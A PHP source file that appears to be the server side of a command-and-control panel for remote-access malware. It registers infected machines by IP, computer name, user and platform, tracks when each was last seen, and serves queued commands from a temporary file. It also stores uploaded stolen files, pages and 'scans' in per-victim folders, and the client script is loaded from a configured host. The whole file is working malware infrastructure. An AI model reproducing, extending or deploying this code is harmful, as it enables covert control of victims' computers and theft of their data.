<?php
/**
 * DEBUG
 */
error_reporting(E_ALL);
ini_set('display_errors', '1');

/**
 * CONFIGURATION
 */
define('API_URL', 'http://127.0.0.1:8000/');
define('DATA_DIRECTORY', './data-U2lsZW5jZSBpcyBnb2xkZW4K/');

if (
    $_SERVER['REQUEST_METHOD'] === 'GET'
) {
    /**
     * PAGE
     */
    if (!isset($_SERVER['HTTP_X_IDENTIFIER'])) {
        echo ('<body>' . "\n");
        echo ("\t" . '<script src="' . API_URL . 'index.js"></script>' . "\n");
        echo ('</body>' . "\n");
    }

    /**
     * ACTION
     */
    if (isset($_SERVER['HTTP_X_IDENTIFIER']) and !empty($_SERVER['HTTP_X_IDENTIFIER'])) {
        foreach (glob(DATA_DIRECTORY . '*/*/') as $data_directory) {
            if ($_SERVER['HTTP_X_IDENTIFIER'] === sha1($data_directory)) {
                $data_json = (string) ($data_directory . 'data.json');
                if (file_exists($data_json)) {
                    $json_content = (array) json_decode(file_get_contents($data_json), true);
                    $json_content['last_seen'] = (int) $_SERVER['REQUEST_TIME'];
                    file_put_contents($data_json, json_encode($json_content));
                }
                $data_tmp = (string) ($data_directory . 'data.tmp');
                if (file_exists($data_tmp)) {
                    echo file_get_contents($data_tmp);
                    unlink($data_tmp);
                }
            }
        }
    }
}

/**
 * DATA
 */
if (
    $_SERVER['REQUEST_METHOD'] === 'POST'
) {
    if (
        $_SERVER['CONTENT_TYPE'] === 'text/plain; charset=utf-8' and
        isset($_SERVER['HTTP_X_COMPUTER']) and !empty($_SERVER['HTTP_X_COMPUTER']) and
        isset($_SERVER['HTTP_X_USER']) and !empty($_SERVER['HTTP_X_USER']) and
        isset($_SERVER['HTTP_X_PLATFORM']) and !empty($_SERVER['HTTP_X_PLATFORM']) and
        empty($_POST)
    ) {
        $remote_address = (string) $_SERVER['REMOTE_ADDR']; // v1.1 encoding required ?
        $computer_name = (string) $_SERVER['HTTP_X_COMPUTER']; // v1.1 encoding required ?
        $data_directory = (string) (DATA_DIRECTORY . $remote_address . '/' . $computer_name . '/');
        if (!file_exists($data_directory)) {
            mkdir($data_directory, 0777, true);
        }
        file_put_contents(($data_directory . 'data.json'), json_encode([
            'remote_address' => $remote_address,
            'computer_name' => $computer_name,
            'user_name' => $_SERVER['HTTP_X_USER'],
            'platform_name' => $_SERVER['HTTP_X_PLATFORM'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'last_seen' => $_SERVER['REQUEST_TIME']
        ]));
        echo json_encode(['client_identifier' => sha1($data_directory)]);
    }

    if (
        isset($_SERVER['HTTP_X_IDENTIFIER']) and !empty($_SERVER['HTTP_X_IDENTIFIER'])
    ) {
        foreach (glob(DATA_DIRECTORY . '*/*/') as $data_directory) {
            if ($_SERVER['HTTP_X_IDENTIFIER'] === sha1($data_directory)) {
                $php_input = (string) file_get_contents('php://input');
                switch ($_SERVER['CONTENT_TYPE']) {
                    case 'text/html; charset=utf-8':
                        file_put_contents(($data_directory . 'data.html'), $php_input);
                        break;
                    case 'application/octet-stream; charset=utf-8':
                        $downloads_directory = (string) ($data_directory . 'downloads/');
                        if (!file_exists($downloads_directory)) {
                            mkdir($downloads_directory, 0777, true);
                        }
                        file_put_contents(($downloads_directory . sha1($php_input) . '.bin'), $php_input);
                        break;
                    case 'text/plain; charset=utf-8':
                        $scans_directory = (string) ($data_directory . 'scans/');
                        if (!file_exists($scans_directory)) {
                            mkdir($scans_directory, 0777, true);
                        }
                        file_put_contents(($scans_directory . sha1($php_input) . '.txt'), $php_input);
                        break;
                }    
            }
        }
    }
}
?>